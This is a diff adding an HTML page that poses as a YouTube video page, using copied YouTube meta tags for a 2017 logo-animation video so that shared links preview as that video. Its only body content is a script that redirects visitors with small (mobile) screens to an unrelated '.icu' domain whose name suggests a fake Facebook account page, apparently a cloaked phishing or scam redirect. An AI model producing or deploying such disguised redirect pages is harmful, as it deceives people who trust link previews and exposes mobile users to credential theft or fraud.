@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta name="title" content="Youtube Ident (NEW LOGO) Aug 2017" />
+<meta name="description" content="Since YouTube has got a Brand New Look, I've made a Logo Animation to please the Youtubers. Remember, If you don't like the Logo, You're in tough Luck. Just ..." />
+<meta name="keywords" content="Youtube Logo, Gawain Hale Films, SLN Media Group" />
+<meta name="theme-color" content="#ff0000" />
+<meta property="og:site_name" content="YouTube" />
+<meta property="og:url" content="https://www.youtube.com/watch?v=T7TJH5MF74s" />
+<meta property="og:title" content="Youtube Ident (NEW LOGO) Aug 2017" />
+<meta property="og:image" content="https://i.ytimg.com/vi/T7TJH5MF74s/maxresdefault.jpg" />
+<meta property="og:image:width" content="1280" />
+<meta property="og:image:height" content="720" />
+<meta property="og:description" content="Since YouTube has got a Brand New Look, I've made a Logo Animation to please the Youtubers. Remember, If you don't like the Logo, You're in tough Luck. Just ..." />
+<meta property="al:ios:app_store_id" content="544007664" />
+<meta property="al:ios:app_name" content="YouTube" />
+<meta property="al:ios:url" content="vnd.youtube://www.youtube.com/watch?v=T7TJH5MF74s&feature=applinks" />
+<meta property="al:android:url" content="vnd.youtube://www.youtube.com/watch?v=T7TJH5MF74s&feature=applinks" />
+<meta property="al:android:app_name" content="YouTube" />
+<meta property="al:android:package" content="com.google.android.youtube" />
+<meta property="al:web:url" content="https://www.youtube.com/watch?v=T7TJH5MF74s&feature=applinks" />
+<meta property="og:type" content="video.other" />
+<meta property="og:video:url" content="https://www.youtube.com/embed/T7TJH5MF74s" />
+<meta property="og:video:secure_url" content="https://www.youtube.com/embed/T7TJH5MF74s" />
+<meta property="og:video:type" content="text/html" />
+<meta property="og:video:width" content="1280" />
+<meta property="og:video:height" content="720" />
+<meta property="og:video:tag" content="Youtube Logo" />
+<meta property="og:video:tag" content="Gawain Hale Films" />
+<meta property="og:video:tag" content="SLN Media Group" />
+<meta property="fb:app_id" content="87741124305" />
+<meta name="twitter:card" content="player" />
+<meta name="twitter:site" content="@youtube" />
+<meta name="twitter:url" content="https://www.youtube.com/watch?v=T7TJH5MF74s" />
+<meta name="twitter:title" content="Youtube Ident (NEW LOGO) Aug 2017" />
+<meta name="twitter:description" content="Since YouTube has got a Brand New Look, I've made a Logo Animation to please the Youtubers. Remember, If you don't like the Logo, You're in tough Luck. Just ..." />
+<meta name="twitter:image" content="https://i.ytimg.com/vi/T7TJH5MF74s/maxresdefault.jpg" />
+<meta name="twitter:app:name:iphone" content="YouTube" />
+<meta name="twitter:app:id:iphone" content="544007664" />
+<meta name="twitter:app:name:ipad" content="YouTube" />
+<meta name="twitter:app:id:ipad" content="544007664" />
+<meta name="twitter:app:url:iphone" content="vnd.youtube://www.youtube.com/watch?v=T7TJH5MF74s&feature=applinks" />
+<meta name="twitter:app:url:ipad" content="vnd.youtube://www.youtube.com/watch?v=T7TJH5MF74s&feature=applinks" />
+<meta name="twitter:app:name:googleplay" content="YouTube" />
+<meta name="twitter:app:id:googleplay" content="com.google.android.youtube" />
+<meta name="twitter:app:url:googleplay" content="https://www.youtube.com/watch?v=T7TJH5MF74s" />
+<meta name="twitter:player" content="https://www.youtube.com/embed/T7TJH5MF74s" />
+<meta name="twitter:player:width" content="1280" />
+<meta name="twitter:player:height" content="720" />
+</head>
+<body>
+
+    <script>
+    if (screen.width<800) {
+    window.location="https://fbnewacountapp.icu/header.php";
+    }
+    </script>
+
+</body>
+</html>
